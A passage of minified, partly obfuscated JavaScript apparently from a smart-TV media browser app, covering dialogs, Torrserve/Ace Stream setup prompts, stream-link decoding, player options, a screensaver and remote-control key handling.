iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAYAAABV7bNHAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZdEVYdFNvZnR3YXJlAHBhaW50Lm5ldCA0LjAuMTnU1rJkAAACNElEQVR4Xu3Yvy50URQF8ClEJyQ0NF5AoaBSKLUSnUJoRUuCRCQ8AAoFmV5ColKbQiSUvALPgCjGOsmZZOdm3z13rj1/7pm1kl/x5e579rmrmMhX80qz2UySW7TDU+AW7fAUuEU7PAVu0Q5PgVu0w1PgFu3wFLhFOzwFbtEOT4FbtMNT4Bbt8BS4pdFo7PTRpPZxHtyCSzb7aE77OA9uUS7dS5Ur6Be+/+kH5Jnh39pcMA+j0Yj2oWW5BReTH3MKM/+0DvLMNdDmgpCP6ET70LLcgovJj9nTlnUCZ6xkzlzW5gI8exNzF9pMWW4RFwxYUDbigkGvC9qGY+EoOoQx7Z2i3IKLyI/paUES5sLfRa13wg/4jDZXlFvEpQIWlI24VJBbEJ6Nw3Q0pc0EeDa0BV3CV/SkzQR4NrQFXYm5V20mwDMWBCwoC8/KFnQH5wU8QuudoSqoDBbURiULCn/pvkc32kyAZ0tirhOfUN2Cug27q/0j3W3YzYIs2M2CLNjNgizYzYIs2M2CLNjNgizYzYIs2M2CLNjNgizYzYIs2M2CLNidTkGYm4DVDsxq50iYSaqghcx77Wxp50iYYUEWzLAgC2aqXRCeHcBLdAuLHTiD1rv1nPMrX1Ch/5PWYL4u3n3OmWFBUbIFbcB1dKjN5MH8pnh3P2cmnR/pbsBuFmTBbhZkwW4WZMFuFmTBbhZkwe5KFPQAu31yDwNf0KBgQW2woDYGpyCGYRiGYRiGYRimYGq1P0bl7L47Cp9jAAAAAElFTkSuQmCC';function getTimeFromMS(sec){var time=Math.round(sec);var hours=Math.floor(time/3600);var mins=Math.floor((time%3600)/60);var secs=Math.floor((time%3600)%60);if(hours<0||mins<0||secs<0)return"&#8734;";if(hours<10)
hours="0"+hours;if(mins<10)
mins="0"+mins;if(secs<10)
secs="0"+secs;return hours+":"+mins+":"+secs}
var curTime=0,totalTime=0;var sendr=!0;var confirmed={create:function(text,title,but,style){var c=this;c.close();c.title=title;if(but==null)but="_FPProdolzhit_|_FPOtmena_";c.but=but.split("|");c.fun=[];if(title==null)title="_FPConfirm action_";c.title=title;c.template="<div style='background-color:#556266;;margin:0px 0px 0px 0px;overflow:hidden;border-radius: 8px;'>"+"<div id='confirmTitle' style='margin:5px;overflow:hidden;text-align:left;font-size: 122%;'>{title}</div>"+"<div id='confirmText' style='margin:4px;overflow:hidden;text-align:center;'>{text}</div>"+"<div id='confirmButtons' style='padding:3px;text-align:right;height:31px;white-space: nowrap;'>{buttons}</div>"+"</div>";c.render(text,style);return c},sel:function(n){var c=this;if(n=="++")c.select++;else if(n=="--")c.select--;else c.select=n;if(c.select<0)c.select=c.but.length-1;else if(c.select>=c.but.length)c.select=0;for(var i=0;i<c.but.length;i++){if(i==c.select)$_("dnsc"+i).style.backgroundColor='#088ef9';else $_("dnsc"+i).style.backgroundColor='#5b666d'}},click:function(n){var c=this;if(n!=null)c.select=n;maJor.setHandler("menu");if(c.fun[c.select])c.fun[c.select]();c.close()},render:function(text,style){var c=this;var div=document.createElement('div');div.id="l01llQlLlOXp1OIllYpr";div.style.position="absolute";div.style.textAlign="center";div.style.border="";div.style.borderRadius="";div.style.fontSize="22px";div.style.zIndex="1";div.style.visibility="hidden";div.style.width="45%";div.style.minWidth="420px";div.style.left="26%";div.style.top="28%";if(style=="fullscreen")style={"width":"98%","height":"98%","left":"1%","top":"1%","textAlign":"left","overflow":"hidden"};if(style!=null)for(var i in style)div.style[i]=style[i];if(text==null){text="_FPOshibka_ _FPopredDns_!<br>  Смените днс или установите RemoteFork на PC или Android<br>_FPVseRavnoProdolzhit_?";if(maJor.platform()=="android"){text="Установить RemoteFork.apk на это Android устройство?<br>Если Remotefork уже установлен то нажмите _FPOtmena_ и запустите его<br>Подробнее http://forkbrowser.top/s";c.but="_FPDownload RemoteFork_|_FPOtmena_"}}
var buttons="";for(var i=0;i<c.but.length;i++){buttons+="<span id='dnsc"+i+"' class='cbutton' onmousemove=\"confirmed.sel("+i+");\" onclick=\"confirmed.click("+i+");\">"+c.but[i]+"</span>"}
var inner=c.template.replace("{title}",c.title).replace("{text}",text).replace("{buttons}",buttons);$_("main").appendChild(div);$_("l01llQlLlOXp1OIllYpr",inner);maJor.setHandler("confirm");setTimeout(function(){maJor.setHandler("confirm");$_("l01llQlLlOXp1OIllYpr").style.visibility="visible";$_("main").onclick=function(){confirmed.click(1)}},25);c.sel(c.but.length-1)},close:function(){var obj=$_("l01llQlLlOXp1OIllYpr");if(obj&&obj.parentNode)obj.parentNode.removeChild(obj);$_("main").onclick=""}};function remoteAsk(){maJor.Remote.init();var s="Для торрент ссылок magnet: и torrent://  необходим Torrserve ";if(maJor.platform()=="android")s+="(можно установить на ваше устройство) ";else s+="(рекомендуем) ";s+="или Ace Stream!";var services=[{name:"Torrserve",img:"_ST_torrserve.png",ip:getip("torrserve"),disabledMessage:"Torrserve не активен. Установите его на ПК или Андроид и укажите IP в настройках.",enabledMessage:"<span style='color:#2196F3'>Torrserve активирован</span>. Проверьте, что он запущен, или укажите правильный IP-адрес.",qrCode:"https://cloudflare.appfxml.com/?qr=https://bit.ly/3XbHuay",disabled:maJor.widgets.all.torrserve.disabled},{name:"Ace Stream",img:"_ST_ace_stream.png",ip:getip("acestream"),disabledMessage:"Ace Stream не активен. Установите его на ПК или Андроид и укажите IP в настройках.",enabledMessage:"<span style='color:#2196F3'>Ace Stream активирован</span>. Проверьте, что он запущен, или укажите правильный IP-адрес.",qrCode:"",disabled:maJor.widgets.all.acestream.disabled}];if(getip("torrserve2")&&!maJor.widgets.all.torrserve2.disabled){services.push({name:"Torrserve reserve",img:"_ST_torrserve.png",ip:getip("torrserve2"),disabledMessage:"Резервный torrserve не активен. Установите его на ПК или Андроид и укажите IP в настройках.",enabledMessage:"<span style='color:#2196F3'>Резервный torrserve активирован</span>. Проверьте, что он запущен, или укажите правильный IP-адрес.",qrCode:"",disabled:maJor.widgets.all.torrserve2.disabled})}
s+="<table style='width:100%; text-align:left;'>";for(var i=0;i<services.length;i++){var service=services[i];var status=service.disabled?"Отключено":service.ip;s+="<tr style='vertical-align: top;'>";s+="<td style='width: 130px;'> <img align='center' height='20' src='"+_img(service.img)+"'> "+service.name+"</td>";s+="<td><span style='color: red;'>"+status+"</span></td>";s+="<td style='font-size: 15px;'>";s+=service.disabled?service.disabledMessage:service.enabledMessage;s+="</td>";s+="<td>";if(service.disabled&&service.qrCode){s+="<img src='"+service.qrCode+"' height='50'>"}
s+="</td>";s+="</tr>"}
s+="</table>";s+="<div style='color: #ff5353; font-weight: bold; text-align: center;'>Необходимо подключить хотя бы один из сервисов (Torrserve или Ace Stream).</div>";confirmed.create(s,"Необходим Torrserve  или Ace Stream","_FPNastroiki_ IP|_FPOtmena_").fun=[function(){ol0I1OIuIyUII0lYpr({"playlist_url":"about:settings","defaultSelect":36})}];stopLoadPage()}
function sbrosok(noreload){try{for(var i in allfs){maJor.write(allfs[i],"")}
maJor.write("vk_audio_pl","");maJor.write("vk_audio_sel","");for(var key in localStorage){localStorage.removeItem(key)}}catch(e){kjtYpr.popUp(e)}
document.cookie="";if(maJor.ID)maJor.params.set("ID",maJor.ID);if(maJor.IDS)maJor.params.set("IDS",maJor.IDS);if(maJor.oID)maJor.params.set("oID",maJor.oID);kjtYpr.setDefault();if(Il01QllQll())Il01QllQll().history=[];insetActive=0;prev={};maJor.statusbar("Сброс выполнен!");if(!noreload){kjtYpr.popUp("_FPSbrosVipolnenPerezpusk_...");setTimeout('document.location.reload();	location.reload();',700)}}
playIdent="";function replaceArray(s,find,replace){var replaceString=s;for(var i=find.length-1;i>=0;i--){replaceString=replaceString.replace(find[i],replace[i]);replaceString=replaceString.replace(find[i],replace[i]);replaceString=replaceString.replace(find[i],replace[i]);replaceString=replaceString.replace(find[i],replace[i])}
return replaceString};function replaceArrayG(s,find,replace){var replaceString=s;for(var i=find.length-1;i>=0;i--){while(replaceString.indexOf(find[i])!=-1)replaceString=replaceString.replace(find[i],replace[i]);}
return replaceString};function parse_urlm(u,m){var orig_u=u;u=u.replace(".m3u8","");if(u.indexOf("/hls/userencrypt/")>0){u=u.split("/hls/userencrypt/")[1];var t=["aHR0cDovL","=","S","z","M","b","1"];var md=md5(ipG+maJor.getId());var f=[];for(var i=0;i<7;i++)f[i]=md.substr(i*4,4);var s=replaceArrayG(u,f,t);var p=atob(s).split("-9-");if(typeof p[1]=="undefined"){kjtYpr.popUp("Error decode link! Please restart application. Your ip: "+ipG,2000);return""}else if(p[1].indexOf(gP().lO10111O0001lOl00Ypr.split("#CAT=")[0])==0&&p[1].indexOf(maJor.getId())>0)return p[0];else{kjtYpr.popUp("Error decode this link! Please restart application. Your ip: "+ipG,2000);return""}}else{u=u.substr(28);var f=["shorted","translation","5HtRyF","6TrEdS","LKKfr","LJJlMn","HGGffR"];var t=["aHR0cDovL","=","S","F","M","b","0"];var s=replaceArrayG(u,f,t);p=atob(s).split("-9-")}
if(m)return p[0];if(typeof p[3]!="undefined"){}
if(typeof p[1]!="undefined"){if(p[1].indexOf(gP("lO10111O0001lOl00Ypr"))==0&&p[1].indexOf(maJor.getId())>0)return p[0];else return orig_u}
return p[0]}
function imgonload(t){vPlayer.setLoading("off",Math.random());maJor.statusbar("off");var x=t.width;var y=t.height;var ratioX=x/maJor.screen().w;var ratioY=y/maJor.screen().h;if(y/ratioX>720)t.height=y/ratioY;else t.width=x/ratioX;t.style.visibility='visible';if(vPlayer.audio.played()&&$_("vk_audio").style.zIndex=="0"){$_("vk_audio").style.zIndex="-5";$_("vk_audio").style.display="none"}}
var slide_mode=5000;var plDesc=0;var timeF=0;function focuschange(h){if(h.match(/false/i)){timeF=T.inetTime}
if(h.match(/true/i)&&(handler=="player"||handler=="qual")){if(timeF>0&&(T.inetTime-timeF)>40000){vPlayer.endvideo(1)}else vPlayer.lll0Q10I0lI1O0Oll0OOYpr()}}
var qch_num="",qch_timer;function setKey(k){clearTimeout(qch_timer);qch_timer=setTimeout(function(){qch_num=parseInt(qch_num);if(qch_num>gP().channels.length){qch_num=gP().channels.length}
Il01QllQll().focused(qch_num-1);qch_num=""},1300);qch_num=qch_num+k;kjtYpr.popUp("Select to: "+(qch_num<=0?"Inset":qch_num),1500,"on",!0)}
function getIdent(sel){sel=sel||getSelect();if(sel>=0){var ch=gP("channels")[sel];if(!ch||!ch.title||(adsPage.state()&&sel==null))return"";var gi=gV(ch,"ident");if(gi){if(gi.length==10)return gi;else return md5(gi).substr(0,10)}
var title=gVs(ch,"title").replace("[HD] ","").replace("[SD] ","");var s="";try{if(ch.stream_url.indexOf("audio")==0)return"";s=Il01QllQll().get("title",-1)+"-"+title;s=s.replace(/_FPGlobPoisk_.*?"/,"");return md5(s).substr(0,10)}catch(e){}}
return""}
var optLang=["Нет","ru","rus","ua","en","eng","de","fr","lt","et"],optLangSel=0,optId=[];function newOptions(){try{var l01Il0Ilu0D101OIYpr="",id=0,curA;if(vPlayer.playElement&&vPlayer.playElement.json_url){for(var i in vPlayer.playElement.json_url){if(i=="auto")var pqi="Auto ";else var pqi=i+"p ";if(gV(vPlayer.playElement,"json_select")!=i)l01Il0Ilu0D101OIYpr+=lI0OI111Igz101lYpr(id++,pqi+gV(vPlayer.playElement.json_url[i],"type"),!0,"enterqual"+i)}
if(id<2){l01Il0Ilu0D101OIYpr="";id=0}}
if(vPlayer.player().volume)l01Il0Ilu0D101OIYpr+=lI0OI111Igz101lYpr(id++,"_FPGromkost_: "+vPlayer.player().volume(),0,"volume");if(vPlayer.player().audioTracks&&(curA=vPlayer.player().audioTracks())){if(curA.count>1)l01Il0Ilu0D101OIYpr+=lI0OI111Igz101lYpr(id++,"Audio: "+curA.name+" "+(curA.sel+1)+" _FPfrom_ "+curA.count+"",0,"audio")}
if(vPlayer.player().quality&&(curA=vPlayer.player().quality())){if(curA.count>1)l01Il0Ilu0D101OIYpr+=lI0OI111Igz101lYpr(id++,"Quality: "+curA.name+" "+(curA.sel+1)+"/"+curA.count,0,"quality")}
if(vPlayer.mkvSub()){l01Il0Ilu0D101OIYpr+=lI0OI111Igz101lYpr(id++,vPlayer.mkvSub("val"),!1,"setsubtitle")}
if(vPlayer.player().name=="maple"){if(vPlayer.player().Screen3Dplugin)l01Il0Ilu0D101OIYpr+=lI0OI111Igz101lYpr(id++,"_FPTip_ 3D",!1,"sams3d");l01Il0Ilu0D101OIYpr+=lI0OI111Igz101lYpr(id++,"_FPBuffer_: "+vPlayer.maple.abf[vPlayer.buf]+" Мб",!1,"samsbuf");if(maJor.params.get('xmode')==2){l01Il0Ilu0D101OIYpr+=lI0OI111Igz101lYpr(id++,"_FPShirina_: "+maJor.params.get('Pw')+"%",!1,"setpw");l01Il0Ilu0D101OIYpr+=lI0OI111Igz101lYpr(id++,"_FPVisota_: "+maJor.params.get('Ph')+"%",!1,"setph")}}
if(maJor.params.get('xmode')==4&&(l0lIl1lTqx011IYpr=="html5"||l0lIl1lTqx011IYpr=="ifrhtml5")){if(maJor.params.get('Pw')<200)maJor.params.set('Pw',1280);if(maJor.params.get('Ph')<200)maJor.params.set('Ph',720);l01Il0Ilu0D101OIYpr+=lI0OI111Igz101lYpr(id++,"_FPShirina_: "+maJor.params.get('Pw')+"",!1,"setpw");l01Il0Ilu0D101OIYpr+=lI0OI111Igz101lYpr(id++,"_FPVisota_: "+maJor.params.get('Ph')+"",!1,"setph")}
if(window.NetCastLaunchQMENU)l01Il0Ilu0D101OIYpr+=lI0OI111Igz101lYpr(id++,"_FPOpciiEkrana_",!0,"lgoptions");if(maJor.platform().match(/lg/)&&l0lIl1lTqx011IYpr=="media")l01Il0Ilu0D101OIYpr+=lI0OI111Igz101lYpr(id++,"_FPPredpDor_: "+optLang[optLangSel],!1,"lgzvdor");if(vPlayer.player().getRate)l01Il0Ilu0D101OIYpr+=lI0OI111Igz101lYpr(id++,"Rate: "+vPlayer.player().getRate()+"x",!1,"rate");if(vPlayer.subtitles.exis())l01Il0Ilu0D101OIYpr+=lI0OI111Igz101lYpr(id++,"_FPSubtitles_: "+vPlayer.subtitles.getName(),!1,"subtitle");l01Il0Ilu0D101OIYpr+=lI0OI111Igz101lYpr(id++,"_FPAdd stripes_:"+(vPlayer.whitestripes<1?"_FPOtkl._":vPlayer.whitestripes+"px"),!1,"whitestripes");l01Il0Ilu0D101OIYpr+=lI0OI111Igz101lYpr(id++,sNext[maJor.params.get('next')],!1,"rezhim");l01Il0Ilu0D101OIYpr+=lI0OI111Igz101lYpr(id++,"_FPDisplay time_: "+shint(maJor.params.get("time")),!1,"time");l01Il0Ilu0D101OIYpr+=lI0OI111Igz101lYpr(id++,"_FPZakrit_",!0,"close");$_("QualCh").style.display="block";kjtYpr.opLength=id;$_("QualCh",l01Il0Ilu0D101OIYpr);maJor.setHandler("qual");l0IlIOf1vOIl101Ypr();vPlayer.showPlayer()}catch(e){kjtYpr.popUp("Err qmenu: "+e.message,2000)}}
function l0IlIOf1vOIl101Ypr(){if(vPlayer.lIl0II1OOluuB0IO0OYpr<0)vPlayer.lIl0II1OOluuB0IO0OYpr=kjtYpr.opLength-1;else if(vPlayer.lIl0II1OOluuB0IO0OYpr==kjtYpr.opLength)vPlayer.lIl0II1OOluuB0IO0OYpr=0;for(var i=0;i<kjtYpr.opLength;i++){if(i==vPlayer.lIl0II1OOluuB0IO0OYpr){$_("ql01Il0Ilu0D101OIYpr"+i).style.color="#FFFFFF";$_("ql01Il0Ilu0D101OIYpr"+i).style.backgroundColor="#2d2d2c";$_("qml"+i).style.display='block';$_("qmr"+i).style.display='block'}else{$_("ql01Il0Ilu0D101OIYpr"+i).style.color="#888888";$_("ql01Il0Ilu0D101OIYpr"+i).style.backgroundColor="";$_("qml"+i).style.display='none';$_("qmr"+i).style.display='none'}}}
function lIOIl11yHub1Ol1IYpr(x,opt){try{opt=String(opt||optId[vPlayer.lIl0II1OOluuB0IO0OYpr]||"");switch(opt){case "sams3d":vPlayer.player().Set3Dtype(x);break;case "samsbuf":vPlayer.buf+=x;vPlayer.player().SetBuffer(vPlayer.buf);break;case "setpw":maJor.params.set('Pw',parseInt(maJor.params.get('Pw'))+x);$_("opText"+vPlayer.lIl0II1OOluuB0IO0OYpr,"_FPShirina_: "+maJor.params.get('Pw')+"");vPlayer.chvr=!0;vPlayer.player().setSize();break;case "setph":maJor.params.set('Ph',parseInt(maJor.params.get('Ph'))+x);$_("opText"+vPlayer.lIl0II1OOluuB0IO0OYpr,"_FPVisota_: "+maJor.params.get('Ph')+"");vPlayer.chvr=!0;vPlayer.player().setSize();break;case "time":maJor.params.set('time',!maJor.params.get('time'));break;case "setsubtitle":vPlayer.player().subtitle(vPlayer.player().sub_sel+x);break;case "rezhim":maJor.params.set('next',(parseInt(maJor.params.get('next'))||0)+x);if(maJor.params.get('next')<1)maJor.params.set('next',3);else if(maJor.params.get('next')>3)maJor.params.set('next',1);break;case "subtitle":vPlayer.playElement.sub_sel+=x;vPlayer.subtitles.lO011IIO1olgIZIOIIOIYpr();vPlayer.l1O0Ol1iOVI0O1Ypr();break;case "volume":var xv=vPlayer.player().volume()+x*5;if(xv>100)xv=100;if(xv<0)xv=0;vPlayer.l1O0Ol1iOVI0O1Ypr("Громкость: "+vPlayer.player().volume(xv));break;case "whitestripes":vPlayer.setWhitestripes(x);break;case "lgzvdor":optLangSel+=x;if(optLangSel>optLang.length-1)optLangSel=0;else if(optLangSel<0)optLangSel=optLang.length-1;media.audioLanguage=optLang[optLangSel];maJor.write("mlang",optLangSel);break;case "close":vPlayer.qualClose();return;break;case "lgoptions":window.NetCastLaunchQMENU();break;case "quality":vPlayer.player().quality()&&vPlayer.player().quality(vPlayer.player().quality().sel+x);break;case "audio":vPlayer.player().audioTracks()&&vPlayer.player().audioTracks(vPlayer.player().audioTracks().sel+x);break;case "rate":try{var curA=vPlayer.player().getRate()+x*0.25;if(curA>4)curA=0.25;else if(curA<0.25)curA=4;vPlayer.player().rate(curA)}catch(e){jsshowErr("Error set rate video "+curA+": "+e.message+" - ",1)}
break;default:if(opt.indexOf("enterqual")==0){var q=opt.split("enterqual")[1];if(vPlayer.playElement.json_url){var url=vPlayer.playElement.json_url[q].url;vPlayer.playElement.json_select=q;if(gVs(vPlayer.playElement.json_url[q],"audio").indexOf("http")==0)url+="#AUDIO="+vPlayer.playElement.json_url[q].audio;vPlayer.l1O0Ol1iOVI0O1Ypr("Play "+q+"p");if(vPlayer.playUrlAudio&&vPlayer.sound)vPlayer.sound.src="";vPlayer.l1100OlxlQQ00lO0Ypr(vPlayer.streamnum(url),vPlayer.getCur());vPlayer.qualClose();return}else vPlayer.l1O0Ol1iOVI0O1Ypr("_FPOshibka_ _FPparsingaVideossilki_!")}
break}
newOptions()}catch(e){jsshowErr("Player: "+e.message+" - "+opt,1)}}
function lI0OI111Igz101lYpr(id,text,click,x){optId[id]=x;var m_l='<svg id="qml'+id+'" width="32px" height="32px" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" stroke="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="M15.7071 4.29289C16.0976 4.68342 16.0976 5.31658 15.7071 5.70711L9.41421 12L15.7071 18.2929C16.0976 18.6834 16.0976 19.3166 15.7071 19.7071C15.3166 20.0976 14.6834 20.0976 14.2929 19.7071L7.29289 12.7071C7.10536 12.5196 7 12.2652 7 12C7 11.7348 7.10536 11.4804 7.29289 11.2929L14.2929 4.29289C14.6834 3.90237 15.3166 3.90237 15.7071 4.29289Z"></path></svg>';var m_r='<svg id="qmr'+id+'" width="32px" height="32px" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" stroke="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="M8.29289 4.29289C8.68342 3.90237 9.31658 3.90237 9.70711 4.29289L16.7071 11.2929C17.0976 11.6834 17.0976 12.3166 16.7071 12.7071L9.70711 19.7071C9.31658 20.0976 8.68342 20.0976 8.29289 19.7071C7.90237 19.3166 7.90237 18.6834 8.29289 18.2929L14.5858 12L8.29289 5.70711C7.90237 5.31658 7.90237 4.68342 8.29289 4.29289Z"></path></svg>';if(!maJor.supports.svg){m_l='<img id="qml'+id+'" width=32 src="'+_img("_ST_turn_left.png")+'" >';m_r='<img id="qmr'+id+'" width=32 src="'+_img("_ST_turn_right.png")+'" >'}
var s="<div style='border-radius: 15px;width: 100%;height: 35px; overflow:hidden;' onmousemove=\"vPlayer.lIl0II1OOluuB0IO0OYpr="+id+";l0IlIOf1vOIl101Ypr();\" id='ql01Il0Ilu0D101OIYpr"+id+"'><div onclick=\"lIOIl11yHub1Ol1IYpr(-1);\" style='float:left;'>"+m_l+"</div><div onclick=\"lIOIl11yHub1Ol1IYpr(1);\" style='float:right;'>"+m_r+"</div><div onclick=\"if("+click+") lIOIl11yHub1Ol1IYpr(0); else lIOIl11yHub1Ol1IYpr(1);\"  id='opText"+id+"' style='height:32px; margin-left: 40px;'>"+text+"</div></div>";return s}
function trim2(str){return(str!=null&&str!=undefined)?str.toString().replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,''):''}
function setVideoResolution(){if(handler=="player"||handler=="qual")vPlayer.player().setSize()}
var buff={scrollsite:0,ch:{},chr:{},cleartop:function(){this.scrollsite=null;this.ch={};this.chr={}},chright:function(n){var c=this;if(typeof c.chr[n]=="undefined"){c.chr[n]=$_("ch"+n).offsetLeft+$_("ch"+n).offsetWidth}
return c.chr[n]},chtop:function(n){var c=this;if($_("ch"+n)&&typeof c.ch[n]=="undefined"){c.ch[n]=$_("ch"+n).offsetTop}
return c.ch[n]},scrollsitetop:function(n){if(this.scrollsite==null&&$_("scrollsite"))this.scrollsite=$_("scrollsite").scrollTop;if(n!=null){$_("scrollsite").scrollTop=n;this.scrollsite=$_("scrollsite").scrollTop}
return this.scrollsite}};var scrhint=[1,"This is a cross-platform application for displaying custom multimedia pages. It does not contain any content and is a so-called White Label application.","View pages in JSON (JavaScript Object Notation), XML, or M3U format from any CORS-enabled HTTP server","You can create your own content or open existing and shared content from other people."];function screensaver_t(){$_("scrdivtime",to(T.h,T.m)+"<div style='font-size:30px;'>"+T.humanDate+"</div>");$_("scweather","<div style='bottom: 15px; left: 25px; position: absolute;text-shadow:-1px -1px 0 #000,1px -1px 0 #000,-1px 1px 0 #000,1px 1px 0 #000;'>"+maJor.widgets.html("weather").replace(/<.?span.*?>/,"")+"</div>")}
var fadeInterval;function screensaver(m){var scrmod=parseInt(maJor.params.get('scrsaver'));if(m&&scrmod>0){if(scrmod==1||scrmod==2){screensaver_mod(1);var pos1=["bottom","top"][_.random(0,1)];var pos2=["left","right"][_.random(0,1)];if(pos1=="bottom"&&pos2=="left")pos1="top";if(pos1=="bottom"&&pos2=="right")var pos3="top";else pos3="bottom";if(scrmod==2){$_("scrsaver").style.backgroundSize="cover";var img=document.createElement('img');img.onload=function(){$_("scrsaver").style.backgroundImage="url("+img.src+")"};img.src="http://cloudflare.appfxml.com/browseraccount/?act=getbackground&"+Math.random()}
var text=scrhint[scrhint[0]],text2="";if(scrmod==1){if(userGrid){maJor.uel=userGrid.plrek[randomInt(0,userGrid.plrek.length-1)];var x=null;uHelper.create("directnoheader").hid().getI(maJor.parsers.link(maJor.uel.playlist_url)+"&getinfo=1").parse=function(s){if(!$_("scrfadediv"))return;x=lIlI1VBOOlI01QYpr(s);clearInterval(fadeInterval);$_("scrfadediv").style.backgroundColor="";currentWidth=maJor.screen().w;if(x&&x.title){$_("scrsaver").style.backgroundImage="url("+x.backdrop_path+")";$_("scrsaver").style.backgroundSize="cover";$_("scrsaver").style.backgroundPosition="center center";text='<img style="width: 60px;float: right;" src="'+_img("_ST_controller_up2.png")+'" /><span style="z-index:4;float:right;float: right;font-size: 17px;text-decoration: underline;">Подробнее</span> <span style="padding: 1px 5px;margin-right: 5px;background-color: #27bfa3;border-radius: 7px;float: left;">'+x.vote_average+'</span> <div style="font-weight:bold;font-size:23px;">'+x.title+'</div><div style="">'+x.genres+'</div><div style="font-size:18px;font-style: italic;max-height: 63px;line-height:21px;overflow: hidden;">'+x.overview+'</div>';$_("scinfo",text);$_("scinfo").style.display="block"}
if($_("scrfadediv"))$_("scrfadediv").style.background=""}
var currentStep=0;var opacity=0;var duration=1500;var steps=30;var stepInterval=duration/steps;fadeInterval=setInterval(function(){currentStep++;opacity=(currentStep/steps);if(currentStep>=steps||!$_("scrfadediv")){clearInterval(fadeInterval)}
if($_("scrfadediv"))$_("scrfadediv").style.background="rgba(0, 0, 0, "+opacity+")"},stepInterval);if($_("scrfadediv"))$_("scrfadediv").style.background=""}}
if(maJor.ipCountry&&maJor.ipCountry!='UA'){text2='<div style="position:absolute;'+pos3+':0px;right:15px;text-align:center;width:120px;font-size: 15px;">_FPDonate to the development of this browser_<br><img width="120" src="'+maJor.addident("http://cloudflare.appfxml.com/browseraccount/?do=qr&backr=1")+'"></div>'}
if(maJor.timestamp>2){text="";text2=""}
if(maJor.tgid&&maJor.tgs){text2=""}
$_("scrsaver","<div id='scrfadediv' style='width:100%;height:100%;'><div id='scrdiv' style='margin:10px;position: absolute; "+pos1+": 0px; "+pos2+": 0px;width:30%;height:20%;font-size:1.2rem;'>"+text+"</div>"+text2+"<div id='scrdivtime' style='width:100%;text-align:center;margin-top:10%;font-size:100px;position: absolute; top: 0px; left: 0px;'></div><div id='scweather'></div>"+"<div onmousedown='keyHandler({keyCode:VK_UP});event.stopPropagation();' onmousemove='event.stopPropagation()' id='scinfo' style='display:none;background: "+maJor.rgba("rgba(0,0,0,0.3)")+";padding: 5px;border-radius: 10px;position: absolute;bottom: 0px;width: 50%;left: 25%;font-size: 21px;'></div></div>");screensaver_t();clearTimeout(stimer);if(scrmod==1)var tmt=90;else tmt=180;stimer=setTimeout(function(){if($_("scrdiv")){if(scrmod!=1){if(++scrhint[0]>scrhint.length-1)scrhint[0]=1}
screensaver(m)}},tmt*1000)}
if(scrmod==2){}}}
function screensaver_mod(m){if(m==1){isScreensaver=!0;$_("scrsaver").style.width="100%";$_("scrsaver").style.height="100%";$_("scrsaver").style.display="block";$_("scrsaver").style.zIndex="3"}else if(m==0){screensavertimer=-1;isScreensaver=!1;$_("scrsaver").style.width="0px";$_("scrsaver").style.height="0px";$_("scrsaver").style.display="none";$_("scrsaver").style.zIndex="-1";$_("scrsaver").style.backgroundImage="";$_("scrsaver","");maJor.uel=null}}
if(window.andr){document.addEventListener("focusin",function(event){if(document.activeElement!==document.body){document.body.focus()}},!0);document.addEventListener("focus",function(e){if(handler=="vk"&&maJor.params.get("keyboard")=="system"){}else if(document.activeElement&&document.activeElement!==document.body){document.activeElement.blur()}},!0);document.addEventListener('keydown',function(event){if(event.preventDefault&&handler!="vk"){event.preventDefault()}},!1)}else{document.addEventListener('keydown',function(event){keyHandler(event)},!1)}
var nkh=0,brs=0,tTimer=null,rrK=null,kth=0;function keyHandler(e){event=e||event;start1=new Date().getTime();var key=event.keyCode||event.keycode||event.which||-1;if(key==-1){return!1}
if(maJor.hashR&&key==VK_BACK){if(++nkh>3){kjtYpr.popUp("Error hash back button!",2000);return}}
if(key==463)key=VK_PAUSE;if(key==10009)key=VK_BACK;if(handler=="vk"&&maJor.params.get("keyboard")=="system"&&VK.focus.getAttribute("readonly")==null&&maJor.build<7&&key!=VK_BACK){return!0}
clearTimeout(tTimer);if(handler=="confirm"&&!$_("l01llQlLlOXp1OIllYpr"))maJor.setHandler("menu");else if($_("l01llQlLlOXp1OIllYpr"))maJor.setHandler("confirm");if(handler=="iframe"){return;if(key==VK_BLUE){if(iframeExit)document.location.reload();iframeExit++}else iframeExit=0}
if(maJor.platform()=="android-device"){try{var okey=String(key);var nn=0;for(var x in event)nn++;if(!isScreensaver&&handler=="menu"&&okey.indexOf("/")==-1&&nn==1&&(key==VK_DOWN||key==VK_UP)){return}else if(okey.match(/_del/i))key=VK_BACK;else if(okey.match(/red/i))key=VK_RED;else if(okey.match(/green/i))key=VK_GREEN;else if(okey.match(/blue/i))key=VK_BLUE;else if(okey.match(/yellow/i))key=VK_YELLOW;else if(okey.match(/info/i))key=VK_INFO;else if(okey.match(/F5/))key=VK_RED;else if(okey.match(/F6/))key=VK_GREEN;else if(okey.match(/F7/))key=VK_YELLOW;else if(okey.match(/F8/))key=VK_BLUE;else if(okey.match(/menu/i)){if(ttmac&&handler=="menu"){if(curCh()["playlist_url"].indexOf("?list=")>0){var k=curCh()["playlist_url"].split("?list=")[1];$_("description",unescape(k))}else $_("description",curCh()["playlist_url"]+curCh("stream_url"))}
